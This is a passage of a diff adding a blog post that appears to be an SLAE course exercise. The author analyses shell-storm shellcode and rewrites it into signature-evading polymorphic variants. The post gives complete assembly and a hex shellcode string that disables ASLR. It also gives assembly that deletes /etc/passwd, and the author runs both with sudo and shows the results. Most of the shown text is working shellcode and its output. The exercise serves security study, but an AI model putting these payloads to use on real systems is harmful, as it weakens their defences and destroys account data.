+    <span class="c">; S_IRWXG    00070 group has read, write, and execute permission</span>
+    <span class="c">; S_IROTH    00004 others have read permission</span>
+    <span class="c">; S_ISVTX  0001000 sticky bit</span>
+
+    <span class="c">; Equivalent instructions for:</span>
+    <span class="c">; mov    al, 0x8 ; sys_creat - open or create a file</span>
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span> <span class="mh">0x9</span>
+    <span class="k">sub</span>    <span class="n">al</span><span class="p">,</span> <span class="mh">0x1</span>
+    <span class="k">int</span>    <span class="mh">0x80</span> <span class="c">; open the file</span>
+
+    <span class="k">mov</span>    <span class="n">ebx</span><span class="p">,</span><span class="n">eax</span> <span class="c">; save the file descriptor</span>
+
+    <span class="c">; Equivalent instructions for:</span>
+    <span class="c">; push   eax ; push the file descriptor onto the stack</span>
+    <span class="k">mov</span> <span class="err">[</span><span class="n">esp</span><span class="o">-</span><span class="mi">4</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
+    <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x4</span>
+
+    <span class="c">;; Beginning to setup the write syscall by</span>
+    <span class="c">;; placing the required information into</span>
+    <span class="c">;; the proper registers</span>
+    <span class="c">;; ssize_t write(int fd, const void *buf, size_t count);</span>
+    <span class="k">mov</span>    <span class="n">dx</span><span class="p">,</span><span class="mh">0x3a30</span>  <span class="c">; Push :0 onto the stack</span>
+    <span class="k">push</span>   <span class="n">dx</span> <span class="c">; push it onto the stack</span>
+    <span class="k">mov</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>
+    <span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
+
+    <span class="c">; Equivalent instructions for:</span>
+    <span class="c">; inc    edx ; count of bytes to be written which is 1</span>
+    <span class="k">inc</span>    <span class="n">edx</span> <span class="c">; count of bytes to be written which is 1</span>
+    <span class="k">inc</span>    <span class="n">edx</span> <span class="c">; for confusion</span>
+    <span class="k">inc</span>    <span class="n">edx</span> <span class="c">; for confusion</span>
+    <span class="k">dec</span>    <span class="n">edx</span> <span class="c">; for confusion</span>
+    <span class="k">dec</span>    <span class="n">edx</span> <span class="c">; for confusion</span>
+
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x4</span> <span class="c">; sys_write syscall</span>
+    <span class="k">int</span>    <span class="mh">0x80</span>
+
+    <span class="k">mov</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0x6</span> <span class="c">; sys_close syscall</span>
+    <span class="k">int</span>    <span class="mh">0x80</span>   <span class="c">; returns 0 into eax on success</span>
+
+    <span class="k">inc</span>    <span class="n">eax</span>  <span class="c">; increment eax to syscall 1 - exit syscall</span>
+    <span class="k">int</span>    <span class="mh">0x80</span> <span class="c">; exit gracefully</span></code></pre></figure>
+
+<p>After compiling and running we see:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>cat /proc/sys/kernel/randomize_va_space
+2
+<span class="gp">$ </span>sudo ./deactivateaslrpoly
+<span class="gp">$ </span>cat /proc/sys/kernel/randomize_va_space
+0</code></pre></figure>
+
+<p>It still works after the polymorphic adjustments. And the byte
+count is:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>vim ~/.bashrc
+<span class="gp">$ </span>./compile.sh deactivateaslrpoly
+<span class="o">[</span>+] Assembling with Nasm ...
+<span class="o">[</span>+] Linking ...
+<span class="o">[</span>+] Done!
+<span class="gp">$ </span>asmtocstub deactivateaslrpoly deactivateaslrpolystub
+The bytes of the shellcode are:
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+Writing shellcode to deactivateaslrpolystub.c
+<span class="gp">$ </span>./deactivateaslrpolystub
+Shellcode Length:  110</code></pre></figure>
+
+<p>Cool. Our byte length is under the 124 byte limit and works as expected!</p>
+
+<h2 id="shellcode-3-unlink-etcpasswd-and-exit">Shellcode 3: Unlink /etc/passwd and exit</h2>
+
+<p>Now lets work with something a little mischievous.
+<a href="http://shell-storm.org/shellcode/files/shellcode-560.php">unlink /etc/passwd and exit</a>
+What is unlink /etc/passwd you ask?</p>
+
+<p><a href="http://man7.org/linux/man-pages/man2/unlink.2.html">unlink</a></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">unlink, unlinkat - delete a name and possibly the file it refers to</code></pre></figure>
+
+<p>Interesting… So this shellcode will delete the /etcpasswd file. This
+would probably cause a little havoc on a system. Luckily we are using
+a vm! Even though we know it is probably going to break our vm, lets
+analyze the code just to see exactly how it works.</p>
+
+<p>Lets first take the shellcode provided in it’s C form, compile,
+throw it in gdb and extract the assembly code:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">=&gt; </span>0x0804a040 &lt;+0&gt;:	    jmp    0x804a053 &lt;shell+19&gt;
+   0x0804a042 &lt;+2&gt;:	    pop    esi
+   0x0804a043 &lt;+3&gt;:	    xor    eax,eax
+   0x0804a045 &lt;+5&gt;:	    xor    ecx,ecx
+   0x0804a047 &lt;+7&gt;:	    xor    edx,edx
+   0x0804a049 &lt;+9&gt;:	    mov    al,0xa
+   0x0804a04b &lt;+11&gt;:	mov    ebx,esi
+   0x0804a04d &lt;+13&gt;:	int    0x80
+   0x0804a04f &lt;+15&gt;:	mov    al,0x1
+   0x0804a051 &lt;+17&gt;:	int    0x80
+   0x0804a053 &lt;+19&gt;:	call   0x804a042 &lt;shell+2&gt;
+   0x0804a058 &lt;+24&gt;:	das    
+   0x0804a059 &lt;+25&gt;:	gs
+   0x0804a05a &lt;+26&gt;:	je     0x804a0bf
+   0x0804a05c &lt;+28&gt;:	das    
+   0x0804a05d &lt;+29&gt;:	jo     0x804a0c0
+   0x0804a05f &lt;+31&gt;:	jae    0x804a0d4
+   0x0804a061 &lt;+33&gt;:	ja     0x804a0c7
+   0x0804a063 &lt;+35&gt;:	add    BYTE PTR <span class="o">[</span>eax],al</code></pre></figure>
+
+<p>So the first thing that jumps out about this shellcode is that it
+appears to be utilizing the <code class="highlighter-rouge">jmp call</code> pop technique.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">=&gt; </span>0x0804a040 &lt;+0&gt;:	    jmp    0x804a053 &lt;shell+19&gt;
+   0x0804a042 &lt;+2&gt;:	    pop    esi &lt;-- Address after call goes here
+
+   .. snip ..
+
+   0x0804a053 &lt;+19&gt;:	call   0x804a042 &lt;shell+2&gt;
+   0x0804a058 &lt;+24&gt;:	das &lt;-- Call places the address of this instruction on the stack
+
+   .. snip ..</code></pre></figure>
+
+<p>Ok. So what is this code acquiring the address of? Well, the code
+after the call seems to be a bit cryptic which could mean that this is
+actually a string. Lets have a look…</p>
+
+<p>If we put a breakpoint right after the pop call and use <code class="highlighter-rouge">x/s $esi</code> we
+can investigate if a string is pointed to by esi.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Breakpoint 5, 0x0804a043 <span class="k">in </span>shell <span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span> disass
+Dump of assembler code <span class="k">for function </span>shell:
+   0x0804a040 &lt;+0&gt;:	jmp    0x804a053 &lt;shell+19&gt;
+   0x0804a042 &lt;+2&gt;:	pop    esi
+<span class="gp">=&gt; </span>0x0804a043 &lt;+3&gt;:	xor    eax,eax
+   0x0804a045 &lt;+5&gt;:	xor    ecx,ecx
+   0x0804a047 &lt;+7&gt;:	xor    edx,edx
+   0x0804a049 &lt;+9&gt;:	mov    al,0xa
+   0x0804a04b &lt;+11&gt;:	mov    ebx,esi
+   0x0804a04d &lt;+13&gt;:	int    0x80
+   0x0804a04f &lt;+15&gt;:	mov    al,0x1
+   0x0804a051 &lt;+17&gt;:	int    0x80
+   0x0804a053 &lt;+19&gt;:	call   0x804a042 &lt;shell+2&gt;
+   0x0804a058 &lt;+24&gt;:	das    
+   0x0804a059 &lt;+25&gt;:	gs
+   0x0804a05a &lt;+26&gt;:	je     0x804a0bf
+   0x0804a05c &lt;+28&gt;:	das    
+   0x0804a05d &lt;+29&gt;:	jo     0x804a0c0
+   0x0804a05f &lt;+31&gt;:	jae    0x804a0d4
+   0x0804a061 &lt;+33&gt;:	ja     0x804a0c7
+   0x0804a063 &lt;+35&gt;:	add    BYTE PTR <span class="o">[</span>eax],al
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> x/s <span class="nv">$esi</span>
+0x804a058 &lt;shell+24&gt;:	<span class="s2">"/etc/passwd"</span></code></pre></figure>
+
+<p>Sure enough it appears that esi points to the string
+<code class="highlighter-rouge">/etc/passwd</code>. That makes sense as that is the file this code is
+supposed to unlink.</p>
+
+<p>Ok, continuing with our analysis:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">   0x0804a042 &lt;+2&gt;:	    pop    esi &lt;- Pointing to /etc/passwd
+
+   ; Clear out registers
+   0x0804a043 &lt;+3&gt;:	    xor    eax,eax
+   0x0804a045 &lt;+5&gt;:	    xor    ecx,ecx
+   0x0804a047 &lt;+7&gt;:	    xor    edx,edx
+
+   ; Move syscall unlink 10 into al
+   0x0804a049 &lt;+9&gt;:	    mov    al,0xa
+
+   ; Unlink <span class="k">function </span>signature:
+   ; int unlink<span class="o">(</span>const char <span class="k">*</span>pathname<span class="o">)</span>;
+
+   ; Move pointer to pathname into ebx
+   0x0804a04b &lt;+11&gt;:	mov    ebx,esi
+
+   ; Call unlink
+   0x0804a04d &lt;+13&gt;:	int    0x80
+
+   ; Move syscall 1 <span class="nb">exit </span>into al
+   0x0804a04f &lt;+15&gt;:	mov    al,0x1
+
+   ; Call <span class="nb">exit
+   </span>0x0804a051 &lt;+17&gt;:	int    0x80</code></pre></figure>
+
+<p>So everything is accounted for. This shellcode appears to do exactly
+what the title says it should do. Lets test it out and see if it in
+fact deletes the /etc/passwd file…</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>sudo cp /etc/passwd /etc/passwd.bkup
+<span class="gp">$ </span>stat /etc/passwd
+  File: ‘/etc/passwd’
+  Size: 2008      	Blocks: 8          IO Block: 4096   regular file
+Device: 801h/2049d	Inode: 182305      Links: 1
+Access: <span class="o">(</span>0644/-rw-r--r--<span class="o">)</span>  Uid: <span class="o">(</span>    0/    root<span class="o">)</span>   Gid: <span class="o">(</span>    0/    root<span class="o">)</span>
+Access: 2017-01-08 15:11:35.774016024 -0600
+Modify: 2017-01-02 14:55:00.830518000 -0600
+Change: 2017-01-02 14:55:00.830518000 -0600
+ Birth: -
+<span class="gp">$ </span>sudo ./unlinkpasswd
+Shellcode Length: 35
+<span class="gp">$ </span>stat /etc/passwd
+stat: cannot stat ‘/etc/passwd’: No such file or directory
+<span class="gp">$ </span>sudo mv /etc/passwd.bkup /etc/passwd
+sudo: unknown uid 1000: who are you?
+<span class="gp">$ </span>mv /etc/passwd.bkup /etc/passwd
+mv: cannot move ‘/etc/passwd.bkup’ to ‘/etc/passwd’: Permission denied</code></pre></figure>
+
+<p>LOL! So kids, don’t try this at home unless you can reset your vm!</p>
+
+<p>Lets get our polymorphism on.</p>
+
+<h3 id="polymorphic-unlink-etcpasswd-and-exit-shellcode">Polymorphic Unlink /etc/passwd and Exit Shellcode</h3>
+
+<p>First we need to replicate the <code class="highlighter-rouge">jump, call, pop</code> setup of the original
+shellcode:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">global _start
+section .text
+  _start:
+    jmp    call_shellcode
+
+  executeit:
+    pop    esi
+    xor    eax,eax
+    xor    ecx,ecx
+    xor    edx,edx
+    mov    al,0xa
+    mov    ebx,esi
+    int    0x80
+    mov    al,0x1
+    int    0x80
+
+  call_shellcode:
+    call executeit
+    FileToDelete: db <span class="s2">"/etc/passwd"</span></code></pre></figure>
+
+<p>Next we move some things around to make our code unique:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">global _start
+section .text
+  _start:
+    jmp    call_shellcode
+
+  executeit:
+    pop    esi
+
+    ; Equivilent Instructions <span class="k">for</span>:
+    ; xor    eax,eax
+
+    mov    eax, ecx
+    xor    eax, ecx
+
+    xor    ecx,ecx
+    xor    edx,edx
+
+    ; Equivilent Instructions <span class="k">for</span>:
+    ; mov    al,0xa
+    mov    al, 0xc
+    sub    al, 0x2
+
+    mov    ebx,esi
+    int    0x80
+    mov    al,0x1
+    int    0x80
+
+  call_shellcode:
+    call executeit
+    FileToDelete: db <span class="s2">"/etc/passwd"</span></code></pre></figure>
+
+<p>Lets see if our polymorphed instructions still accomplish their goal:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>stat /etc/passwd
+  File: ‘/etc/passwd’
+  Size: 2008      	Blocks: 8          IO Block: 4096   regular file
+Device: 801h/2049d	Inode: 182305      Links: 1
+Access: <span class="o">(</span>0644/-rw-r--r--<span class="o">)</span>  Uid: <span class="o">(</span>    0/    root<span class="o">)</span>   Gid: <span class="o">(</span>    0/    root<span class="o">)</span>
+Access: 2017-01-09 16:50:23.534014000 -0600
+Modify: 2017-01-02 14:55:00.830518000 -0600
+Change: 2017-01-02 14:55:00.830518000 -0600
+ Birth: -
+<span class="gp">$ </span>sudo ./unlinkpasswdpoly
+<span class="o">[</span>sudo] password <span class="k">for </span>frankgrimes:
+<span class="gp">$ </span>stat /etc/passwd
+stat: cannot stat ‘/etc/passwd’: No such file or directory</code></pre></figure>
+
+<p>Beautiful! It deletes our /etc/passwd file as we hoped :) We end up
+with a 39 byte shellcode, the original being only 35 bytes so we are
+within our 150% increase.</p>
+
+          </div>
+
+          <div class="article-share">
+            
+            <a href="" title="Share on Twitter" onclick="window.open('https://twitter.com/home?status=SLAE Problem 6: Shell-Storm.com Shellcode Analy... - http://localhost:4000/posts/slae-problem-6-shell-storm-polymorphism by @blischalk', 'newwindow', 'width=500, height=225'); return false;">
+              <span class="icon icon-social-twitter"></span>
+            </a>
+            <a href="" title="Share on Facebook" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/posts/slae-problem-6-shell-storm-polymorphism', 'newwindow', 'width=500, height=500'); return false;">
+              <span class="icon icon-social-facebook"></span>
+            </a>
+            <a href="" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=http://localhost:4000/posts/slae-problem-6-shell-storm-polymorphism', 'newwindow', 'width=550, height=400'); return false;">
+              <span class="icon icon-social-googleplus"></span>
+            </a>
+          </div>
+
+          <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional" target="_blank">
+            <img src="/assets/offsec-student-certified-emblem-rgb-oscp.png" />
+          </a>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script>
+              (function() {
+                  var d = document, s = d.createElement('script');
+                  s.src = '//blischalkblog.disqus.com/embed.js';
+                  s.setAttribute('data-timestamp', +new Date());
+                  (d.head || d.body).appendChild(s);
+              })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          
+        </article>
+        <footer class="footer reveal">
+  <p>
+    Site content by: <a href="/about" title="About me">Brett Lischalk</a>.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  <script type="text/javascript" src="/assets/vendor.js"></script>
+<script type="text/javascript" src="/assets/application.js"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>
+<script>
+  WebFont.load({
+    google: {
+      families: ['Cormorant Garamond:700', 'Lato:300,400,700']
+    }
+  });
+</script>
+
+
+  <script>
+    window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;
+    ga('create','UA-4121143-2','auto');ga('send','pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+
+</body>
+</html>
